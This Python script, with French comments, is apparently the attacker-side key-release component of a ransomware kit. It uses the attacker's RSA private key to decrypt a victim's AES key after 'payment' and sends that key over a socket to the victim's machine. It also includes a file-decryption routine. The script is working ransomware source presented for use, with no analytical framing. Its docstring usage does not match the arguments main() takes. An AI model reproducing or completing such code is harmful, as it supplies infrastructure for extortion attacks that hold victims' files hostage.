#!/usr/bin/env python3
"""
decrypt.py — Déchiffre les fichiers après "paiement" (ATTAQUANT → TARGET)
Usage: python3 decrypt.py <dossier> <victim_id> <private.pem> <received_keys/>

Exemple:
  python3 decrypt.py /home/victim A1B2C3D4 private.pem received_keys/A1B2C3D4.hex
"""

import sys
import os
import socket
import json
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

def load_private_key(path):
    with open(path, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)

def decrypt_aes_key(private_key, enc_key_hex):
    enc_key = bytes.fromhex(enc_key_hex.strip())
    return private_key.decrypt(
        enc_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )

def decrypt_file(enc_path, aes_key):
    with open(enc_path, "rb") as f:
        data = f.read()

    iv = data[:16]
    ciphertext = data[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded) + unpadder.finalize()

    original_path = enc_path[:-4]  # retire .enc
    with open(original_path, "wb") as f:
        f.write(plaintext)

    os.remove(enc_path)
    return original_path

def send_aes_key(aes_key, target):
    host, port = target.rsplit(":", 1)
    payload = json.dumps({"aes_key": aes_key.hex()}).encode()
    s = socket.socket()
    s.connect((host, int(port)))
    s.sendall(payload)
    s.close()
    print(f"[+] Clé AES envoyée à {target}")

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <victim_id> <private.pem> <key.hex> <target_ip:port>")
        print(f"Ex:    {sys.argv[0]} FEAB3AA0 private.pem received_keys/FEAB3AA0.hex 10.0.0.2:7777")
        sys.exit(1)

    victim_id    = sys.argv[1]
    privkey_path = sys.argv[2]
    key_hex_path = sys.argv[3]
    target       = sys.argv[4]

    print(f"[*] Chargement de la clé privée RSA...")
    private_key = load_private_key(privkey_path)

    print(f"[*] Déchiffrement de la clé AES (victim: {victim_id})...")
    with open(key_hex_path) as f:
        enc_key_hex = f.read()
    aes_key = decrypt_aes_key(private_key, enc_key_hex)
    print(f"[+] Clé AES déchiffrée")

    send_aes_key(aes_key, target)

if __name__ == "__main__":
    main()
